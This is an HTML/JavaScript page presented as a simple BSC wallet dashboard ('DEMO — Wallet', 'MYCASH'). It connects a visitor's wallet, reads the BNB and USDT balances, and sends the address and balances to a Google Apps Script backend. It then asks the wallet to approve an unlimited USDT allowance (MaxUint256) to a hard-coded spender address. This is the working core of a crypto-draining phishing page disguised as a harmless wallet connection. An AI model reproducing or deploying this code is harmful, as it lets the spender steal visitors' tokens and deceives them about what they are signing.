<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>DEMO — Wallet</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}

    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#050816;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }

    header{
      background:#071027;
      padding:10px 16px;
      position:sticky;
      top:0;
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.03);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .nav-right{
      display:flex;
      align-items:center;
      gap:10px;
      flex-wrap:wrap;
      justify-content:flex-end;
    }
    .nav-right a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    .nav-right a:hover{
      background:#0f1b33;
    }
    .connect{
      background:#3b82f6;
      color:#fff;
      padding:8px 14px;
      border-radius:999px;
      border:0;
      cursor:pointer;
      font-size:0.9rem;
      white-space:nowrap;
    }
    .connect.connected{
      background:#15803d;
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }

    .top-info{
      margin-bottom:14px;
      font-size:0.84rem;
      color:#9fb0c8;
      display:flex;
      flex-wrap:wrap;
      gap:10px 18px;
    }
    .mono{
      font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;
    }

    .card-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .card-title h1{
      font-size:1.9rem;
      margin-bottom:0.4rem;
    }
    .card-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    .wallet-card{
      border-radius:1.5rem;
      padding:1.4rem 1.6rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.4rem;
      border:1px solid rgba(148,163,184,0.35);
      box-shadow:0 20px 45px rgba(15,23,42,0.9);
      background:radial-gradient(circle at top left,#111827,#020617);
    }

    .wallet-left,
    .wallet-center,
    .wallet-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }
    .wallet-left{
      min-width:150px;
      gap:0.4rem;
    }
    .wallet-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }
    .wallet-icon-base{
      width:54px;
      height:54px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.6);
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
    .wallet-icon-base img{
      width:70%;
      height:70%;
      object-fit:contain;
      display:block;
    }
    .wallet-subline{
      font-size:0.8rem;
      color:#9fb0c8;
    }

    .wallet-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.35rem;
    }
    .wallet-main-text{
      font-size:1.1rem;
      color:#e5e7eb;
    }
    .wallet-note{
      font-size:0.86rem;
      color:#9fb0c8;
      max-width:380px;
    }

    .connected-pill{
      margin-top:6px;
      padding:4px 12px;
      border-radius:999px;
      font-size:0.8rem;
      background:rgba(34,197,94,0.15);
      border:1px solid rgba(34,197,94,0.7);
      color:#bbf7d0;
      display:inline-flex;
      align-items:center;
      gap:6px;
    }
    .connected-pill::before{
      content:"";
      width:6px;
      height:6px;
      border-radius:999px;
      background:#22c55e;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}
    .wallet-extra{
      margin-top:18px;
      font-size:0.85rem;
      color:#9fb0c8;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

    @media(max-width:768px){
      .wallet-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .wallet-left{
        align-items:center;
      }
      .wallet-right{
        align-items:center;
      }
    }
    @media (max-width: 640px){
      header{
        padding:8px 10px;
      }
      .nav{
        max-width:100%;
        flex-direction:column;
        align-items:stretch;
        justify-content:flex-start;
        gap:6px;
      }
      .logo{
        width:100%;
        text-align:center;
        font-size:0.9rem;
        letter-spacing:3px;
      }
      .nav-right{
        width:100%;
        justify-content:center;
        gap:6px;
      }
      .nav-right a{
        padding:4px 8px;
        font-size:0.85rem;
      }
      header .connect{
        width:100%;
        max-width:260px;
        padding:8px 12px;
        font-size:0.9rem;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="logo">DEMO</div>
      <div class="nav-right">
        <a href="home.html">Wallet</a>
        <a href="home.html">Task</a>
        <a href="hold-earn.html">Earn</a>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <div class="top-info">
      <div>Status: <span id="statusText">Not connected</span></div>
      <div>Address: <span id="walletAddress" class="mono">—</span></div>
      <div>Network: <span id="walletNetwork">—</span></div>
      <div>User ID: <span id="userId" class="mono">-</span></div>
    </div>

    <div id="walletPage">
      <div class="card-title">
        <h1>Connect your BSC wallet</h1>
        <p>Once connected we show your BNB / USDT balance and request token approval.</p>
      </div>

      <div class="wallet-card">
        <div class="wallet-left">
          <div class="wallet-tag">Wallet</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="Trust Wallet">
          </div>
          <span class="wallet-subline">BSC • USDT</span>
        </div>

        <div class="wallet-center">
          <div class="wallet-main-text">Use the top button to connect.</div>
          <div class="wallet-note">
            You’ll stay logged in with your User ID as long as the wallet stays connected.
          </div>
        </div>

        <div class="wallet-right">
          <span id="connectHintCard" class="small">
            Wallet not connected.
          </span>
          <span id="connectedPill" class="connected-pill" style="display:none;">
            Connected
          </span>
        </div>
      </div>

      <div class="wallet-extra">
        <div>BNB Balance: <span id="walletBalance">—</span></div>
        <div id="tokens" style="margin-top:6px">
          Connect wallet to see USDT balance.
        </div>
      </div>
    </div>
  </main>

  <footer>
    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
  </footer>

  <!-- Web3 + Ethers -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- Web3Modal HTML SDK (WalletConnect v3) -->
  <script type="module">
    /* ===== Web3Modal + Wagmi setup ===== */
    window.process = { env: { NODE_ENV: "production" } };

    if (window.customElements && !window.customElements._w3mPatched) {
      const origDefine = window.customElements.define.bind(window.customElements);
      window.customElements.define = (name, ctor, options) => {
        if (window.customElements.get(name)) {
          console.warn("Custom element already defined, skipping:", name);
          return;
        }
        return origDefine(name, ctor, options);
      };
      window.customElements._w3mPatched = true;
    }

    import {
      EthereumClient,
      w3mConnectors,
      w3mProvider,
      WagmiCore,
      WagmiCoreChains
    } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
    import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";

    const { configureChains, createConfig, getAccount } = WagmiCore;
    const { bsc } = WagmiCoreChains;

    const WALLETCONNECT_PROJECT_ID = "f89aac819fc8f8516ef9010d98d2fe7b";

    const chains = [bsc];
    const { publicClient } = configureChains(
      chains,
      [w3mProvider({ projectId: WALLETCONNECT_PROJECT_ID })]
    );

    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains
      }),
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const web3Modal = new Web3Modal(
      {
        projectId: WALLETCONNECT_PROJECT_ID,
        themeMode: "dark",
        enableEmail: false,
        enableOnramp: false
      },
      ethereumClient
    );

    async function getActiveEip1193Provider() {
      const account = getAccount(wagmiConfig);
      const connector = account?.connector;
      if (connector && connector.getProvider) {
        return await connector.getProvider();
      }
      if (window.ethereum) return window.ethereum;
      throw new Error("No provider from Web3Modal connection");
    }

    /* ===================== APP LOGIC ===================== */

    function formatToken(n) {
      n = Number(n);
      if (Number.isInteger(n)) return n.toString();
      return n.toFixed(4).replace(/\.?0+$/, "");
    }

    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
    const APPS_SCRIPT_SECRET = "justforme";

    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955";
    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

    const BNB_CHAIN_ID_DEC = 56;
    const BNB_CHAIN_ID_HEX = "0x38";
    const BNB_LABEL        = "BNB Smart Chain (56)";
    const BNB_RPC          = "https://bsc-dataseed.binance.org";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)"
    ];
    const ERC20_ALLOWANCE_ABI = [
      "function allowance(address owner, address spender) view returns (uint256)"
    ];

    const TOKEN_DECIMALS = 18;

    let providerInstance      = null;
    let web3Instance          = null;
    let currentAddress        = null;
    let currentUserId         = null;
    let currentBNBBalance     = null;
    let currentTokenBalance   = null;
    let isWalletConnected     = false;

    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000);
      return String(num);
    }
    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");
    const connectHintCardEl = document.getElementById("connectHintCard");
    const connectedPillEl   = document.getElementById("connectedPill");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "—";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
      }
    }
    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      currentAddress    = null;
      currentUserId     = null;
      currentBNBBalance = null;
      currentTokenBalance = null;

      setStatus("Not connected");
      setWalletInfo("—","—",null);
      setUserIdUI("-");
      if(connectHintCardEl){
        connectHintCardEl.textContent = "Wallet not connected.";
      }
      if(connectedPillEl){
        connectedPillEl.style.display = "none";
      }
      if(tokensContainer){
        tokensContainer.textContent = "Connect wallet to see USDT balance.";
      }
      if(connectBtn){
        connectBtn.textContent = "Connect Wallet";
        connectBtn.classList.remove("connected");
      }
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", async function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          await restoreSessionFromAddress(addr);
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address || "",
          network     : networkText || "",
          timestamp   : new Date().toISOString(),
          userId      : userId || "",
          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
          eventType   : eventType || "connect"
        });

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
          console.warn("TOKEN_ADDRESS invalid");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      if(!provider || !provider.request) return false;
      try{
        await provider.request({
          method:"wallet_switchEthereumChain",
          params:[{chainId:BNB_CHAIN_ID_HEX}]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method:"wallet_addEthereumChain",
              params:[{
                chainId:BNB_CHAIN_ID_HEX,
                chainName:"BNB Smart Chain",
                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
                rpcUrls:[BNB_RPC],
                blockExplorerUrls:["https://bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BNB Smart Chain:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function ensureTokenApproval(){
      async function logApproval(tag){
        await notifyBackend(
          currentAddress || "",
          BNB_LABEL,
          currentUserId || "",
          currentBNBBalance,
          currentTokenBalance,
          tag
        );
      }

      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_token");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_spender");
        return;
      }
      if(!providerInstance){
        console.warn("No providerInstance for approval");
        await logApproval("approval_skipped_no_provider");
        return;
      }

      try{
        setStatus("Preparing token approval…");

        const ethersProvider = new ethers.BrowserProvider(
          providerInstance,
          BNB_CHAIN_ID_DEC
        );
        const signer       = await ethersProvider.getSigner();
        const ownerAddress = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
          alert(
            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
            "It MUST be the BEP-20 token contract address, not your wallet."
          );
          setStatus("Connected (approval skipped)");
          await logApproval("approval_skipped_token_is_wallet");
          return;
        }

        const readContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_ALLOWANCE_ABI,
          ethersProvider
        );
        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
        if (currentAllowance > 0n) {
          setStatus("Connected (already approved)");
          await logApproval("approval_already");
          return;
        }

        setStatus("Waiting for wallet to confirm approval…");
        const writeContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_APPROVE_ABI,
          signer
        );

        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
        setStatus("Approval pending on chain…");
        await tx.wait();

        setStatus("Connected + Approved ✅");
        await logApproval("approval_approved");
      }catch(err){
        console.error("Token approve error:", err);

        let tag = "approval_error";
        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
          tag = "approval_rejected";
        }

        setStatus("Connected (approval failed)");
        alert("Token approval failed: " + (err && err.message ? err.message : err));

        await logApproval(tag);
      }
    }

    async function restoreSessionFromAddress(address){
      currentAddress = address;

      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      currentUserId       = userId;
      currentBNBBalance   = balanceBNB;

      setWalletInfo(address, BNB_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";

      currentTokenBalance = tokenBalanceNum;

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

      isWalletConnected = true;
      if(connectBtn){
        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");
        if(connectHintCardEl){
          connectHintCardEl.textContent = "Wallet connected.";
        }
        if(connectedPillEl){
          connectedPillEl.style.display = "inline-flex";
        }
      }

      return {
        balanceBNB,
        tokenBalance: tokenBalanceNum,
        userId
      };
    }

    async function connectFlow(){
      try{
        setStatus("Connecting…");

        await web3Modal.openModal();   // ← THIS opens the Reown / Web3Modal list

        const account = getAccount(wagmiConfig);
        if (!account || !account.address) {
          setStatus("Connection cancelled");
          return;
        }

        const provider = await getActiveEip1193Provider();

        providerInstance = provider;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        const address = account.address.toLowerCase();

        let chainId    = await web3Instance.eth.getChainId();
        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);

        if (chainIdNum !== BNB_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BNB Smart Chain (mainnet) in your wallet and try again.");
            setStatus("Wrong network");
            return;
          }
          chainId    = await web3Instance.eth.getChainId();
          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
          if(chainIdNum !== BNB_CHAIN_ID_DEC){
            alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
            setStatus("Wrong network");
            return;
          }
        }

        setStatus("Connected");

        const session = await restoreSessionFromAddress(address);
        const balanceBNB   = session.balanceBNB;
        const tokenBalance = session.tokenBalance;
        const userId       = session.userId;

        notifyBackend(
          address,
          BNB_LABEL,
          userId,
          balanceBNB,
          tokenBalance,
          "connect"
        ).catch(console.error);

        await ensureTokenApproval();

      }catch(err){
        console.error("connectFlow error:", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    async function hydrateFromExistingAccount(){
      try{
        const account = getAccount(wagmiConfig);
        if (!account || !account.address) return false;

        const provider = await getActiveEip1193Provider();
        providerInstance = provider;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        setStatus("Restoring session…");
        await restoreSessionFromAddress(account.address.toLowerCase());
        setStatus("Connected (restored)");
        return true;
      }catch(e){
        console.warn("hydrateFromExistingAccount failed:", e);
        return false;
      }
    }

    document.addEventListener("DOMContentLoaded", async function(){
      if(connectBtn){
        connectBtn.addEventListener("click", function(){
          if(isWalletConnected) return;
          connectFlow();
        });
      }

      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();

      const restored = await hydrateFromExistingAccount();
      if(!restored){
        clearSessionUI();
      }
    });
  </script>
</body>
</html>
